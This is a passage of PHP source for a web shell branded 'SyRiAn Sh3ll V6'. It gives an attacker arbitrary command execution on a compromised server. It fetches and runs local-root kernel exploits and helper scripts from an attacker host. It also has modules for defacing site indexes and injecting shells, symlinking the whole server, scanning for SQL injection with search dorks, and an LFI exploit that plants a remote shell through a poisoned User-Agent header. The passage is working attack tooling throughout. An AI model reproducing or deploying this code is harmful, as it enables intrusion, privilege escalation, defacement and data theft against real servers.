	if($_COOKIE["user"] != $user or $_COOKIE["pass"] != md5($pass))
	{
		if($_POST[usrname]==$user && $_POST[passwrd]==$pass)
		{
			print'<script>document.cookie="user='.$_POST[usrname].';";document.cookie="pass='.md5($_POST[passwrd]).';";</script>';
		}
		else
		{
			if($_POST['usrname']){print'<script>alert("Go and play in the street man !!");</script>';}
			echo '
			<body bgcolor="black"><br><br>
			<center><font color=#990000 size=5><b>SyRi</b></font><font color=green size=5><b>An Sh</b></font><font color=gray size=5><b>3ll <font color="red">V6</font></b></font><br>

			<img src="http://www.library-ar.com/cache/eagle.jpg">
			</center>
			<div align="center">
			<form method="POST" onsubmit="if(this.usrname.value==\'\'){return false;}">
			<input dir="ltr" name="usrname" id="username" value="userName" type="text"  size="30" onblur="Blur(\'username\',\'userName\');" onclick="Clear(\'username\',\'userName\');"/><br>
			<input dir="ltr" name="passwrd" id="password" value="" type="password" size="30" onfocus="Focus(2);" /><br>
			<input type="submit" value=" Login  " name="login" />
			</form></p>';
			exit;
		}
	}
}
# ---------------------------------------#
#             SSH Session                #
#----------------------------------------#
error_reporting(0);
session_start();
unset($user);       
unset($pass);
if ($_POST['cmd']) $_POST['cmd'] = my_encode($_POST['cmd']);
$cache_lines = 1000;
$history_lines = 100;
$history_chars = 20;
$user[] = "root";  
$pass[] = md5("sy3");
$alias = array(
	"la"    => "ls -la",
	"rf"    => "rm -f",
	"unbz2" => "tar -xjpf",
	"ungz"  => "tar -xzpf"
);
if (!$_SESSION['user']) {

	$pr_login = "Login:\n";
	$pr_pass = "Password:\n";
	$err = "Invalid login!\n\n";
	$succ = "Warning!
Don`t be stupid .. this is a priv3 server, so take extra care!!!\n\n";
	if ($_SESSION['login'] && $_POST['cmd']) { // WE HAVE USERNAME & PASSWORD
		$_SESSION['output'] .= $pr_pass;
		if (in_array($_SESSION['login'], $user)) { //........ USERNAME EXISTS
			$key = array_search($_SESSION['login'], $user);
			if ($pass[$key] != md5($_POST['cmd'])) { //....... WRONG PASSWORD
				$_SESSION['output'] .= $err;
				unset($_SESSION['login']);
				$prompt = $pr_login;
			} else { //..................................... SUCCESSFUL LOGIN
				$_SESSION['user'] = $_SESSION['login'];
				$_SESSION['whoami'] = substr(Exe("whoami"), 0, -1);
				$_SESSION['host'] = substr(Exe("uname -n"), 0, -1);
				$_SESSION['dir'] = substr(Exe("pwd"), 0, -1);
				$_SESSION['output'] .= $succ;
				$prompt = set_prompt();
				unset($_SESSION['login']);
			}
		} else { //......................................... NO SUCH USERNAME
			$_SESSION['output'] .= $err;
			unset($_SESSION['login']);
			$prompt = $pr_login;
		}
	} else { //................................................ LOGIN PROCESS
		if (!$_SESSION['login'] && !$_POST['cmd']) $prompt = $pr_login;

		if (!$_SESSION['login'] && $_POST['cmd']) {
			$_SESSION['login'] = $_POST['cmd'];
			$_SESSION['output'] .= substr($pr_login, 0, -1) . " $_POST[cmd]\n";
			$prompt = $pr_pass;
		}
	}
} else { //........................................................ LOGGED IN
	$prompt = set_prompt();
	chdir($_SESSION['dir']);
	if ($_REQUEST['clear_hist']) //............................ CLEAR HISTORY
		$_SESSION['history'] = "";
	if ($_SESSION['history']) $hist_arr = explode("\n", $_SESSION['history']);
	if ($_POST['cmd']) {
		if (!in_array($_POST['cmd'], $hist_arr)) { //......... ADD TO HISTORY
			$hist_arr[] = $_POST['cmd'];
			$_SESSION['history'] = implode("\n", $hist_arr);
		}
		if (count($hist_arr) > $history_lines) { //........... CUTOFF HISTORY
			$start = count($hist_arr) - $history_lines;
			$_SESSION['history'] = "";
			for ($i = $start; $i < count($hist_arr); $i++)
				$_SESSION['history'] .= $hist_arr[$i] . "\n";
			$_SESSION['history'] = substr($_SESSION['history'], 0, -1);
			$hist_arr = explode("\n", $_SESSION['history']);
		}
		if($_POST['Setup'])
		{
			$commandName = $_POST['commandName'];
			$commandUrl = "http://SyRiAn Cyb3r Army/commands/".$commandName."zip";
			getFiles($commandUrl);
			UnZip($commandName."zip",getcwd());
			ChangeMode($commandName,0777);
		}
		else if($_POST['execLocal']) 
		{
			$localName = $_POST['localName'];
			$localUrl = "http://SyRiAn Cyb3r Army/locals/".$localName."zip";
			getFiles($localUrl);
			UnZip($localName."zip",getcwd());
			ChangeMode($localName,0777);
			$SSHCommand = "./".$localName;
			Exe($SSHCommand);
		}
		$first_word = first_word($_POST['cmd']);
		if (array_key_exists($first_word, $alias)) { //. CHECKING FOR ALIASES
			$_POST['cmd'] = $alias[$first_word] . substr($_POST['cmd'], strlen($first_word));
			$first_word = first_word($_POST['cmd']);
		}
		switch ($first_word) {
		  case "clear":
			$_SESSION['output'] = "";
			break;
		  case "exit":
			session_destroy();
			refresh();
			break;
		  case "cd":
			$_SESSION['output'] .= $prompt;
				$result = Exe($_POST['cmd'] . " 2>&1 ; pwd");
			$result = explode("\n", $result);
			$_SESSION['dir'] = $result[count($result) - 2];
			if (count($result) > 2) //.............. WE HAVE AN ERROR MESSAGE
				$result[0] = "\n" . substr($result[0], strpos($result[0], "cd: ")) . "\n";
			else $result[0] = "\n";
				$prompt = set_prompt();
				$_SESSION['output'] .= $_POST['cmd'] . $result[0];
				break;
		  default:
			$result = Exe($_POST['cmd'] . " 2>&1");
			if (substr($result, -1) != "\n") $result .= "\n";
			$_SESSION['output'] .= $prompt . $_POST['cmd'] . "\n" . $result;
			$rows = preg_match_all('/\n/', $_SESSION['output'], $arr);
			unset($arr);
			if ($rows > $cache_lines) {
					preg_match('/(\n[^\n]*){' . $cache_lines . '}$/', $_SESSION['output'], $out);
				$_SESSION['output'] = $out[0] . "\n";
			}
		}
	}
}
function my_encode($str) 
{
	$str = str_replace("\\\\", "\\", $str);
	$str = str_replace("\\\"", "\"", $str);
	$str = str_replace("\\'", "'", $str);
	while (strpos($str, "  ") !== false) $str = str_replace("  ", " ", $str);
	return rtrim(ltrim($str));
}
function set_prompt() 
{
	global $_SESSION;
	return $_SESSION['whoami'] . "@" . $_SESSION['host'] . " " . substr($_SESSION['dir'], strrpos($_SESSION['dir'], "/") + 1) . " $ ";
}
function first_word($str) 
{
	list($str) = preg_split('/[ ;]/', $str);
	return $str;
}
function refresh()
{
	global $_SERVER;
	$self = substr($_SERVER['SCRIPT_NAME'], strrpos($_SERVER['SCRIPT_NAME'], "/") + 1);
	header("Location: $self");die();
}
$out = substr(preg_replace('/<\/(textarea)/i', '&lt;/\1', $_SESSION['output']), 0, -1);
if($_GET['id'] == "sshSession")
{
	echo '<HTML>
<HEAD>
  <TITLE>SyRiAn Sh3ll V6 ~~ SSH Session</TITLE>
  <STYLE TYPE="text/css"><!--
	INPUT, TEXTAREA, SELECT, OPTION, TD {
		color: '.$sh3llColor.';
		background-color: #000000;
		font-family: Terminus, Fixedsys, Fixed, Terminal, Courier New, Courier;
	}
	TEXTAREA {
		overflow-y: auto;
		border-width: 0px;
		height: 100%;
		width: 100%;
		padding: 0px;
	}
	INPUT {
		border-width: 0px;
		height: 26px;
		width: 100%;
		padding-top: 5px;
	}
	SELECT, OPTION {
		color: '.$sh3llColor.';
		background-color: #BBBBBB;
	}
	BODY {
		overflow-y: auto;
		margin: 0;
	}
  --></STYLE>
  <SCRIPT LANGUAGE="JavaScript"><!--
hist_arr = new Array();';

foreach ($hist_arr as $key => $value) {
	$value = str_replace("\\", "\\\\", $value);
	$value = str_replace("\"", "\\\"", $value);
	echo "hist_arr[$key] = \"$value\";\n";
}

echo '
function parse_hist(key) {
	if (key < hist_arr.length) {
			if (key != "") {
			document.getElementById(\'input\').value = hist_arr[key];
			document.getElementById(\'input\').focus();
		}
	} else {
			window.location.href = "?clear_hist=1";
	}
}
function input_focus() {
	document.getElementById(\'input\').focus();
}
function selection_to_clipboard() { // IE only!
	if (window.clipboardData && document.selection)
		window.clipboardData.setData("Text", document.selection.createRange().text);
}
if (window.clipboardData)
	document.oncontextmenu = new Function("document.getElementById(\'input\').value = window.clipboardData.getData(\'Text\'); input_focus(); return false");
  --></SCRIPT>
</HEAD>
<BODY onLoad="document.getElementById(\'output\').scrollTop = document.getElementById(\'output\').scrollHeight; input_focus()" TOPMARGIN="0" LEFTMARGIN="0">
<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" HEIGHT="100%" WIDTH="100%">
<TR>
  <TD HEIGHT="100%" BGCOLOR="#000000" STYLE="padding-top: 5px; padding-left: 5px; padding-right: 5px; padding-bottom: 0px"><TEXTAREA ID="output" onSelect="selection_to_clipboard()" onClick="input_focus()" READONLY>'.$out.'</TEXTAREA></TD></TR>
<TR>
  <TD BGCOLOR="#000000"><TABLE CELLPADDING="0" CELLSPACING="5" BORDER="0" WIDTH="100%">
	<TR>
	<FORM METHOD="POST" ACTION="">
	  <TD NOWRAP onClick="input_focus()">'.substr($prompt, 0, -1) .'</TD>
	  <TD WIDTH="100%"><INPUT ID="input" TYPE="';
	  if (!$_SESSION['user'] && $_SESSION['login']){echo "password";}
	  else {echo "text";}
	  echo '" NAME="cmd"></TD>
	';
if ($hist_arr) {
   echo ' <TD NOWRAP><SELECT onChange="parse_hist(this.options[this.selectedIndex].value)">
		<OPTION VALUE="">--- HISTORY</OPTION>';
	for ($i = count($hist_arr) - 1; $i >= 0; $i--) {
		if (strlen($hist_arr[$i]) > $history_chars) $option = substr($hist_arr[$i], 0, $history_chars - 3) . "...";
		else $option = $hist_arr[$i];
		echo "<OPTION VALUE=\"" . $i . "\">$option</OPTION>";
	}
	echo '  <OPTION VALUE="'.($history_lines+1).'">--- CLEAR HISTORY</OPTION></SELECT></TD>';
}

  echo '
  <td>
  </form>
  <form method="post">
  <select name="localName">
  <option value="2007_2.6.9-55" >2007_2.6.9-55</option>
  <option value="2007_2.6.11" >2007_2.6.11</option>
  <option value="2008_2.6.23" >2008_2.6.23</option>
  <option value="2008_2.6.24" >2008_2.6.24</option>
  <option value="2009_2.6.6-34_h00lyshit" >2009_2.6.6-34_h00lyshit</option>
  <option value="2009_2.6.16_raptor" >2009_2.6.16_raptor</option>
  <option value="2009_dene" >2009_dene</option>
  <option value="2009_keris" >2009_keris</option>
  <option value="2009_py2" >2009_py2</option>
  <option value="2010_2.6" >2010_2.6</option>
  <option value="2011_2.6.34" >2011_2.6.34</option>
  </select>
  <input type="submit" name="execLocal" value="./Execute">
  </form>
  </td>
  <form method="post">
  <td>
	  <select name="commandName">
	  <option value="cat" >cat</option>
	  <option value="chmod" >chmod</option>
	  <option value="date" >date</option>
	  <option value="dir" >dir</option>
	  <option value="du" >du</option>
	  <option value="gcc" >gcc</option>
	  <option value="gunzip" >gunzip</option>
	  <option value="gzip" >gzip</option>
	  <option value="id" >id</option>
	  <option value="ln" >ln</option>
	  <option value="ls" >ls</option>
	  <option value="mkdir" >mkdir</option>
	  <option value="mv" >mv</option>
	  <option value="pwd" >pwd</option>
	  <option value="rm" >rm</option>
	  <option value="sh" >sh</option>
	  <option value="su" >su</option>
	  <option value="tail" >tail</option>
	  <option value="tar" >tar</option>
	  <option value="touch" >touch</option>
	  <option value="uname" >uname</option>
	  <option value="wget" >wget</option>
	  <option value="who" >who</option>
	  </select>
	  <input type="submit" name="Setup" value="Setup">
  </td></FORM>
  </TR>
  </TABLE></TD>
</TR>
</TABLE>
<SCRIPT LANGUAGE="JavaScript"><!--
document.getElementById(\'output\').scrollTop = document.getElementById(\'output\').scrollHeight;
--></SCRIPT>
</BODY>
</HTML>';
}
else
{
# ---------------------------------------#
#               Some Info                #
#----------------------------------------#
error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time',0);
$dir = getcwd();
$uname= php_uname();
if(strlen($dir)>1 && $dir[1]==":")
$os = "Windows";
else $os = "Linux";
$serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
$server = substr($SERVER_SOFTWARE,0,120);
echo "<script>
function openPHPInfo()
{
	my_window= window.open (\"?info=getPhpInfo\",\"PHP Info\",\"width=800,height=600,scrollbars=1\");	
}
</script>";
if($_GET['info'] == 'getPhpInfo')
{
	phpinfo();
}
echo "
<body dir='ltr'><table bgcolor='#cccccc' cellpadding='0' cellspacing='0' width='100%'><tbody><tr><td bgcolor='#000000' width='160'>
<p dir='ltr'>&nbsp;&nbsp;</p>
<div dir='ltr' align='center'><font size='4'><b>
<img border='0' src='http://www.library-ar.com/cache/eagle.jpg' width='101' height='93'>&nbsp;</b></font><div
dir='ltr' align='center'><span style='height: 25px;'><b>
<font size='4' color='#FF0000'>SyRi</font><font size='4' color='#008000'>An Sh</font><font size='4' color='#999999'>3ll<br>V6</font></b><span style='font-size: 20pt; color: #990000;'><p></p></span></span></div></td><td
bgcolor=#000000>
<p dir='ltr'><font  size='1'>&nbsp; <b>[<a href=?id=mainPage>Main</a>]</b></span>
<b>[</span><a href=?id=sshSession>SSH Session</a>]</b></span>
<b>[</span><a href=?id=about>About</a>]</b></span>
<b>[</span><a href=?id=logout>Logout</a>]</b></span>
<b>[</span><a href=?id=100>SuiCide</a>]</b></span>
<br>
<font size='1'><br>
&nbsp;   Safe Mode = <sy>".SafeMode()." </sy><font size=1>
&nbsp;   System = <sy>".$os."</sy>
&nbsp;   Magic_Quotes = <sy>". magicQouts()." </sy>
&nbsp;   Curl = <sy>".Curl()." </sy>
&nbsp;   Register Globals = <sy>".RegisterGlobals()." </sy>
&nbsp;   Open Basedir = <sy>".openBaseDir()." </sy>
<br>
&nbsp;   Gzip = <sy>".Gzip()."</sy>
&nbsp;   MySQLI = <sy>".MysqlI()." </sy>
&nbsp;   MSQL = <sy>".MSQL()."</sy>
&nbsp;   SQL Lite = <sy>".SQlLite()."</sy>
&nbsp;   Usefull Locals = <sy>".rootxpL()." </sy>
<br>
&nbsp;   Free Space = <sy>".HardSize(disk_free_space('/'))." </sy>
&nbsp;   Total Space = <sy>".HardSize(disk_total_space("/"))." </sy>
&nbsp;   PHP Version = <sy><a href='javascript:openPHPInfo();'><u>".phpversion()."</u></a> </sy>
&nbsp;   Zend Version = <sy>".zend_version()." </sy>
&nbsp;   MySQL Version = <sy>".mysql_get_server_info()." </sy>
<br>
&nbsp;   MySQL = ".MySQL2()."
&nbsp;   MsSQL = ".MsSQL()."
&nbsp;   PostgreSQL = ".PostgreSQL()."
&nbsp;   Oracle = ".Oracle()."
&nbsp;   Server Name = <sy>".$_SERVER['HTTP_HOST']." </sy>
&nbsp;   Server Admin = <a href = 'mailto:".$_SERVER['SERVER_ADMIN']."'><u><sy>".$_SERVER['SERVER_ADMIN']."</sy></u></a>
<br>
&nbsp;   Dis_Functions = <sy>". DisableFunctions()." </sy><br>
&nbsp;   Your IP = <sy>".GetRealIP()." </sy>
&nbsp;   Server IP = <a href='http://bing.com/search?q=ip:".$serverIP."&go=&form=QBLH&filt=all' target='_blank'><u><sy>".gethostbyname($_SERVER["HTTP_HOST"])."</sy></u></a>
 [</span><a href='http://whois.webhosting.info/".gethostbyname($_SERVER["HTTP_HOST"])."' target='_blank'/>Reverse IP</a>]</span>
&nbsp;   Date Time = <sy>".date('Y-m-d H:i:s')." </sy><br/>
&nbsp;   
[<a href='http://www.md5decrypter.co.uk/' target='_blank'>MD5 Cracker</a>]
[<a href='http://www.md5decrypter.co.uk/sha1-decrypt.aspx' target='_blank'>SHA1 Cracker</a>]
[<a href='http://www.md5decrypter.co.uk/ntlm-decrypt.aspx' target='_blank'>NTLM Cracker</a>]
<br>
<br>
<table bgcolor='#cccccc' width='100%'><tbody><tr>
<td align='right' width='100'><p dir='ltr'><sy>
&nbsp;&nbsp;Server :&nbsp;&nbsp; <br>
<b>uname -a : &nbsp;
<br>pwd : </span>&nbsp;<br>ID : </span>&nbsp;<br></b></sy></td><td>
<p dir='ltr'><font color='#cccccc' size='-2'><b>
<b> &nbsp;&nbsp;".$server."
<br>&nbsp;&nbsp;<a href='http://www.google.com/search?q=".urlencode(php_uname())."' target='_blank'><sy><u>".$uname." </u></sy></a><br>&nbsp;&nbsp;".$dir."<br>&nbsp;&nbsp;".get_current_user()."</b>
</font></td></tr></tbody>
</table>
&nbsp;&nbsp;[<a href='#down'>Down</a>]
 [<a href='javascript:window.print()'>Print</a>]
</table>";
# ---------------------------------------#
#                Main Page               #
#----------------------------------------#
if ($_GET['id']== 'mainPage')
{
	$cmd = $_POST['cmd'];
	echo "<script>window.onload = ChangeSQLType;</script>";
	echo "<form method='POST'><table bgcolor='#cccccc' cellpadding='0' cellspacing='0' width='100%'>
	<tr><td colspan='2' align='center'>".$_POST['alias'].$cmd."</td></tr>
	<tr><td>
	<textarea name='ExecutionArea' rows='20' cols='152'>";
	if(!$_POST || $_POST['login']) // Show Current Directory Contents if No Post in requesting ... 
	{chdir($_POST['directory']);scanDirs();}
	else if($_POST['submitCommands']) // Execute The Alias Command .
	{echo Exe($_POST['alias']);}
	else if($_POST['Execute']) // Execute The Command From Command Line  .
	{
		chdir($_POST['directory']);
		if (strtolower(substr($cmd,0,2)) == 'cd'){chdir(strtolower(substr($cmd,3)));scanDirs();}
		elseif(empty($exec)){scanDirs();}
		else {Exe($cmd);}
	}
# ---------------------------------------#
#          Scripts Hacking               #
#----------------------------------------#
else if($_POST['UpdateIndex'])
{  
	$hackingType = $_POST['hackingType'];
	$ScriptType = $_POST['ScriptType'];
	if($hackingType == 'indexChanger')
	{
		DBConnect($_POST['HOST'],$_POST['USER'],$_POST['PASS'],$_POST['DB']);
		$index = stripslashes($_POST['INDEX']);
		$prefix  = $_POST['PREFIX'];
		if($_POST['injectShell'] == 'yes')
		{
			$injectShellType = $_POST['InjectShellTypeSpan'];
		}
		UpdatingIndex($ScriptType,$index,$prefix,$injectShellType);
	}
	else if($hackingType == 'changeInfo')
	{
		DBConnect($_POST['HOST'],$_POST['USER'],$_POST['PASS'],$_POST['DB']);
		changeInfo($ScriptType,$_POST['adminID'],$_POST['userName'],$_POST['password']);
	}
	else if($hackingType == 'decrypt')
	{getConfigInfo($ScriptType);}
}
# --------------------------
#   Hash Analyzer        
#---------------------------
else if($_POST['submitEval'] && ($_POST['evalOrEnc'] == 'analyze'))
{HashAnalyzer($_POST['php_eval']);}
# --------------------------
#   Get User DirectAdmin       
#---------------------------
else if($_POST['submitEval'] && ($_POST['evalOrEnc'] == 'DirectUser'))
{
	$file = file_get_contents('http://SyRiAn Cyb3r Army/sh/sh.txt');
	$file = str_replace("2082","2222",$file);
	$file = str_replace("exampleSite.com",$_POST['php_eval'],$file);
	GenerateFile('sh.sh',$file);
	ChangeMode('sh.sh',0755);
	Exe('sh sh.sh');
	echo "Look for  [ user".$_POST['php_eval']." ] Directory .";
}
# --------------------------
#   Eval Code   
#---------------------------
else if($_POST['submitEval'] && ($_POST['evalOrEnc'] == 'eval'))
{Evaluation($_POST['php_eval']);}
# --------------------------
#   Encryption  
#---------------------------
else if($_POST['submitEval'] && ($_POST['evalOrEnc'] == 'enc'))
{
	if(!empty($_POST['php_eval']))
	{
		$encString = $_POST['php_eval'];
		for ($i=0;$i<strlen($encString);$i++) 
		{$ToHex .= strtoupper(dechex(ord($encString[$i])));}
		for ($i=0;$i<strlen($encString);$i+=2) 
		{$HextTo .= chr(hexdec($encString[$i].$encString[$i+1]));}
		$ToDEC = 'CHAR('; 
		for ($i=0;$i<strlen($encString); $i++) 
		{$ToDEC .= ord($encString[$i]).(($i<(strlen($encString)-1))?',':')');}
		$DECTo='CHAR('; 
		for ($i=0;$i<strlen($encString); $i++) 
		{$DECTo .= ord($encString[$i]).(($i<(strlen($encString)-1))?',':')');}
		echo "
MD5 			: ".md5($encString)."
Base64 Encode   	: ".base64_encode($encString)."
Base64 Decode   	: ".base64_decode($encString)."
Crypt 			: ".crypt($encString)."
SHA1 			: ".sha1($encString)."
MD4 			: ".hash("md4",$encString)."
SHA256 			: ".hash("sha256",$encString)."
URL Encoding 		: ".urlencode($encString)."
URL Decoding 		: ".str_hex($encString)."
CRC32 			: ".crc32($encString)."
Length 			: ".strlen($encString)."
2HEX                    : 0x".$ToHex."
Hex2 			: ".$HextTo."
2DEC 			: ".$ToDEC."
DEC2			: ".$DECTo."";  
	}
	else{echo "Please Put At Least One Char !";}
}
# --------------------------
#   Generate Server   
#---------------------------
else if($_POST['submitEval'] && ($_POST['evalOrEnc'] == 'genServ'))
{
	chdir(stripslashes($_POST['php_eval']));
	mkdir("allserver", 0755);
	chdir("allserver");
	$exe = Exe("ln -s / allserver");
	if(!$exe)
	{
		getFiles('http://SyRiAn Cyb3r Army/server/ZSortCut.zip');
		unzip('ZSortCut.zip',getcwd());
		DeleteFile('ZSortCut.zip');
	}
	GenerateFile(".htaccess","
	Options Indexes FollowSymLinks
	DirectoryIndex ssssss.htm
	AddType txt .php
	AddHandler txt .php");
	echo 'Now Go to allserver folder '.getcwd().'' ;
}
# --------------------------
#  Scan Ports
#---------------------------
else if($_POST['submitEval'] && ($_POST['evalOrEnc'] == 'scan'))
{PortsScanner($_POST['php_eval']);}
# --------------------------
#  SQL Injection Scanner
#---------------------------
else if($_POST['submitEval'] && ($_POST['evalOrEnc'] == 'sqlScanner'))
{
	set_time_limit(0);
	ignore_user_abort(true);
	ini_set('memory_limit', '128M');
	$google = "http://www.google.com/cse?cx=013269018370076798483%3Awdba3dlnxqm&q=REPLACE_DORK&num=100&hl=en&as_qdr=all&start=REPLACE_START&sa=N";
	$i = 0;
	$a = 0;
	$b = 0;
	while($b <= 900) 
	{
		$a = 0;
		echo " Dork: [ ".$_POST['dork']."]\n";
		ob_flush();flush();sleep(1);
		if(preg_match("/did not match any documents/", Connect_Host(str_replace(array("REPLACE_DORK", "REPLACE_START"), array("".$_POST['dork']."", "$b"), $google)), $val)) 
		{
			echo "See something but not found??";
			ob_flush();flush();sleep(1);
			break;
		}
	
		preg_match_all("/<h2 class=(.*?)><a href=\"(.*?)\" class=(.*?)>/", Connect_Host(str_replace(array("REPLACE_DORK", "REPLACE_START"), array("".$_POST['dork']."", "$b"), $google)), $sites);
		echo "Result of injection...\n";
		ob_flush();flush();sleep(1);
		while(1) 
		{
			ob_flush();flush();sleep(1);
			if(preg_match("/You have an error in your SQL|Division by zero in|supplied argument is not a valid MySQL result resource in|Call to a member function|Microsoft JET Database|ODBC Microsoft Access Driver|Microsoft OLE DB Provider for SQL Server|Unclosed quotation mark|Microsoft OLE DB Provider for Oracle|Incorrect syntax near|SQL query failed/", Connect_Host(str_replace("=", "='", $sites[2][$a])))) 
			{
				echo str_replace("=", "='", $sites[2][$a])." <== Yeah..Vulnerable ! \n";
			} 
			else 
			{
				echo str_replace("=", "='", $sites[2][$a])." <== Not Vulnerable..sorry! \n";
				ob_flush();flush();sleep(1);
			}
			if($a > count($sites[2])-2){echo "Lets..scan other page.. \n";break;}
			$a = $a+1;
		}
		$b = $b+100;
	}
}
# --------------------------
#  LFI Shell Uploader
#---------------------------
else if($_POST['submitEval'] && ($_POST['evalOrEnc'] == 'uploadLFI'))
{
   $target = $_POST['php_eval'];
   $testlfi = "../../../../../../../../../../../../../../../etc/passwd%00";
   $readenv = "../../../../../../../../../../../../../../../proc/self/environ%00";
   $mbooh = preg_split("/.php/", $target);
   $pecah = preg_split("/\//", $mbooh[0]);
   $path = "/";
   $azz = count($pecah) - 1;
   for($g = 3; $g<$azz;$g++) {
        $path.= $pecah[$g]."/";
   }
   $bug = $pecah[$azz].".php".$mbooh[1];
   $host = $pecah[2];
   print "[+] Testing LFI ... ";
   flush();
   $res = FetchURL($target.$testlfi);
   if(preg_match("/root:x:0:0/", $res)) {
        print "[+] Reading /proc/self/environ ... ";
        flush();
        $rez = FetchURL($target.$readenv);
        if(preg_match("/DOCUMENT_ROOT=/", $rez)) {
        print "[+] Exploiting target ...";
        flush();
        $cmd = "<?php system('wget http://www.dallasdesigngroup.com/UserFiles/sh3ll.txt -O sh3ll.php');?>";
        $soket = fsockopen($host, 80);
        $req = "GET ".$path.$bug.$readenv." HTTP/1.0\r\nHost: ".$host."\r\nAccept: */*\r\nUser-Agent: ".$cmd."\r\n\r\n";
        fputs($soket, $req);
        fclose($soket);
        flush();
        $cek = FetchURL("http://".$host.$path."sh3ll.php");
        if(preg_match("/gblack Was Here/", $cek)) {
                print "[+] Exploit successful!\n[+] Shell uploaded to http://".$host.$path."sh3ll.php";
        } else {
                print "[!] Exploit failed!";
        }
        }
        else {
        print "Failed";
        }
   } else {
        print "Failed";
   }
}
# --------------------------
#  Show Users    
#---------------------------
else if($_POST['doAction'] && ($_POST['someAction'] == 'showUsers'))
{
	$showUsers = showUsers();
	if($showUsers == false){echo "[-] Sorry ! I can't Read Users ! ";}
}
# --------------------------
#  Show Headers
#---------------------------
else if($_POST['doAction'] && ($_POST['someAction'] == 'headers'))
{
	foreach(getallheaders() as $header => $value){echo htmlspecialchars($header . ":" . $value)."\n";}
}
# --------------------------
#  Commands Help   
#---------------------------
else if ($_POST['helpCommands'])
{
	echo "
|--------------------------------------------|----------------------------------------------------|---------------------------------------------|
|                  Command                   |                       Example                      |                     Comment                 |
|--------------------------------------------|----------------------------------------------------|---------------------------------------------|
|                  zip                       |          zip FileName                              | Compress the Files Into a ZIP Archive       |
|                  unzip                     |          unzip FileName                            | Extract the ZIP Archives                    |
|                  tar -zcf                  |          tar -zcf zz.tar daily                     | Compress the Files Into a TAR Archive       |
|                  tar -zxf                  |          tar -zxf zz.tar                           | Extract the TAR Archives                    |
|                  tar -czvf                 |          tar -czvf FileName.tar.gz FileName        | Compress the Files Into a GZ  Archive       |
|                  gzip -d                   |          gzip -d FileName.gz                       | Extract the GZ Archives                     |
|                  tar -czvf                 |          tar -czvf FileName.tar.gz database.sql    | Compress the Files Into SQL Archive         |
|                  tar -zxvf                 |          tar -zxvf FileName.tar.gz                 | Extract the Database Files SQL              |
|                  tar -czvf                 |          tar -czvf FileName.tar.gz NewFileName     | Compress the Folders Into a tar.gz Archive  |
|                  ls                        |          ls /home                                  | View the files name in the directory        |
|                  ls -la                    |          ls -la /home                              | View Files And Folders in hidden files      |
|                  pwd                       |          pwd                                       | Show the Current Path                       |
|                   ;                        |          ls;pwd                                    | Combine the Commands                        |
|                  wget                      |          wget http://site.com/file.zip             | Get file from URL Using Wget Command        |
|                  curl -o                   |          curl -o http://site.com/file.zip          | Get file from URL Using curl -o Command     |
|                  lynx -source              |          lynx -source http://site.com/file.zip     | Get file from URL Using lynx -source Command|
|                  get                       |          get http://site.com/file.zip              | Get file from URL Using get Command         |
|                  history                   |          history                                   | Show All Previous Commands that you Executed|
|                  mkdir                     |          mkdir /myNewDir                           | make a new Directory in the server          |
|                  rm                        |          rm file                                   | Deleting Files                              |
|                  rm -r                     |          rm -r myDirectory                         | Deleting Directory and it's Files           |
|                  edit                      |          edit myFile                               | Edit a file using text editer               |
|                  who                       |          who                                       | who's Connected to the server               |
|                  cd                        |          cd /home/user                             | Enter the Selected Path                     |
|                  cd ../                    |          cd ../                                    | Go To Upper Directory                       |
|                  mv                        |          mv myFile1 /home/myFile2                  | Move And Rename The File                    |
|                  find                      |          find myFile                               | Looking for a file or folder                |
|                  ./                        |          ./localroot                               | Execute the Executable file                 |
|                  sh                        |          sh localroot                              | Execute the shell Programming Code          |
|                  uname -a                  |          uname -a                                  | View The Server Kernel Information          |
|                  *                         |          rm *                                      | Execute the Command for all                 |
|                  man                       |          man ls                                    | Help About ls Command                       |
|                  touch                     |          touch myFile                              | Create A new File                           |
|                  gcc                       |          gcc myFile1 -o myFile2                    | Convert to Binary Executable File           |
|                  cat                       |          cat myFile                                | Read the File contents                      |
|                  more                      |          more myFile                               | Read the File easily if it's larg           |
|                  pico                      |          pico myFile                               | Edit File Using Pico Text Editer            |
|                  perl                      |          Perl myFile.pl                            | Execute the Perl Scripts                    |
|                  ln                        |          ln -s /home/myFile myLink                 | Make a link to the file                     |
|                  grep                      |          grep myFile myText                        | Look for the Text in the File               |
|                  chmod                     |          chmod 755 myDirectory                     | Change the permission to Files Or Folders   |
|                  chown                     |          chown root myFile                         | Change the File Owner                       |
|                  chgrp                     |          chgrp root myFile                         | Change The File Group                       |
|                  clear                     |          clear                                     | Clear the Screen                            |
|                  cmp                       |          cmp myFile1 myFile2                       | Compare the Tow Files                       |
|                  crypt                     |          crypt myFile                              | To Encrypt myFile                           |
|                  csplit                    |          csplit myFile                             | Spread the File Into pieces                 |
|--------------------------------------------|----------------------------------------------------|---------------------------------------------|
";
}
# --------------------------
#   Generate CGI      
#---------------------------
else if($_POST['generatePel'])
{
	chdir($_POST['cgiperlPath']);
	mkdir('cgi', 0755);
	chdir('cgi');
	getFiles('http://SyRiAn Cyb3r Army/cgi/compiler.zip');
	UnZip('compiler.zip',getcwd());
	DeleteFile('compiler.zip');
	ChangeMode("compiler",0777);
	if($_POST['cgiType'] == "cgiPerl")
	{
		getFiles('http://SyRiAn Cyb3r Army/cgi/cgiPerl.zip');
		UnZip('cgiPerl.zip',getcwd());
		DeleteFile('cgiPerl.zip');
		ChangeMode("cgiPerl.sy3",0755);
					echo '
Go To Link : cgi/cgiPerl.sy3
Password Is : sy3' ;
	}
	else if($_POST['cgiType'] == "cgiPaython")
	{
		getFiles('http://SyRiAn Cyb3r Army/cgi/cgiPaython.zip');
		UnZip('cgiPaython.zip',getcwd());
		DeleteFile('cgiPaython.zip');
		ChangeMode("cgiPaython.sy3",0755);
					echo '
Go To Link : cgi/cgiPaython.sy3
';
	}
	else if ($_POST['cgiType'] == "cgiUsers")
	{
		getFiles('http://SyRiAn Cyb3r Army/cgi/users.zip');
		UnZip('users.zip',getcwd());
		DeleteFile('users.zip');
		ChangeMode("users.sy3",0755);
					echo '
Go To Link : cgi/users.sy3
';
	}
	GenerateFile('.htaccess','AddHandler cgi-script .sy3');
}
# --------------------------
#   CH Commands 
#---------------------------
else if($_POST['changePermission'])
{
	$file = $_POST['fileName'];
	$newAction = $_POST['per'];
	if($os == 'Windows'){echo "[-] No Permissions in Windows OS.";}
